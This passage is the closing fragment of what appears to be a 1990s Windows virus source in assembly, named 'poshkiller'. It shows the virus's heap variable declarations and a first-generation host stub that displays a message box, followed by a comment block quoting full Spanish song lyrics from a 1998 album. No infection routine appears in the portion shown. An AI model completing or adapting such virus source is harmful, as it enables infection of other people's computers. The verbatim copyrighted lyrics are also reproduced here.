   ; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

   heap_begin      label   byte
   semaphore       db      00h
   pehead          dd      00000000h
   ptr_top_chain   equ     ($-offset virus_start)
   top_chain       dd      00000000h
   temp_addr       dd      00000000h
   fname           db      100h dup (00h)
   header          db      400h dup (00h)
   heap_end        label   byte

   ; Jo parle en Valenci…, no en catal….

   ; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
   ; ³ First generation host                                                   ³
   ; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

   host:
           pop     dword ptr fs:[0]
           pop     eax
           popad

           push    00000000h
           push    offset szTitle
           push    offset szMessage
           push    00000000h
           call    MessageBoxA

           push    00000000h
           call    ExitProcess

   end     poshkiller

   ; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
   ; ³ Bonus Track                                                             ³
   ; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
   ;
   ; If you know spanish, and you are as i am, you'll understand and feel
   ; identified with the following lyrics. It speaks about how the people change
   ; (becoming worse) because the system. It's from Def Con Dos' last album
   ; called 'DE POCA MADRE'. Enjoy!
   ;
   ; Fin de siglo
   ; ÄÄÄÄÄÄÄÄÄÄÄÄ
   ;
   ; No se si a ti te ata¤e
   ; no se si a ti te extra¤a
   ; pero noto a mis amigos algo raro en sus miradas
   ; no me reconocen, ya no me saludan
   ; y ahora todos llevan traje azul en vez de chupa
   ; Ya no beben en la calle
   ; ya no paran en los bares
   ; ya no mean en las esquinas
   ; ni vomitan en los portales
   ; Ahora madrugan, se han vuelto gente seria
   ; que ahorra para la vejez y vota a la derecha
   ; No se que pasa cuando quiero hablar con mis amigos
   ; no cogen el telefono o me dicen que se han ido
   ; no consigo dar con ellos para ir juntos a montarla
   ; y siempre acabo solo apoyando codo en barra
   ; Algo huele raro, algo no me han dicho
   ; y empiezo a sospechar que han sido abducidos
   ; La abduccion es un problema de todos
   ; por favor no me dejeis NO! no me dejeis solo
   ; FIN DE SIGLO rodeado de abducidos
   ; FIN DE SIGLO
   ; FIN DE SIGLO solo y sin amigos
   ; Vaya fin de siglo mas jodido
   ; FIN DE SIGLO rodeado de abducidos
   ; FIN DE SIGLO
   ; FIN DE SIGLO solo y sin amigos
   ; Vaya fin de siglo mas jodido
   ; No se si a ti te ata¤e
   ; no se si a ti te extra¤a
   ; pero replicas de mis amigos han salido de unas vainas
   ; son iguales que ellos, tienen su misma cara, pero se que
   ; no son ellos cuando observo sus miradas
   ; Todos se han cortado las gre¤as
   ; todos han sentado la cabeza
   ; y lo que antes odiaban, ahora se celebra
   ; Ya no fuman PETAS, solo van de farla
   ; y visten polo azul con la bandera patria
   ; Todos felices, todos con el movil
   ; hablan entre ellos, son un nuevo orden
   ; La abduccion es un problema de todos
   ; por favor no me dejeis NO! no me dejeis solo
   ; FIN DE SIGLO rodeado de abducidos
   ; FIN DE SIGLO
   ; FIN DE SIGLO solo y sin amigos
   ; Vaya fin de siglo mas jodido
   ; FIN DE SIGLO rodeado de abducidos
   ; FIN DE SIGLO
   ; FIN DE SIGLO solo y sin amigos
   ; Vaya fin de siglo mas jodido
   ;
   ; ---
   ; Copyright (c) 1998 Def Con Dos; "De Poca Madre" album.
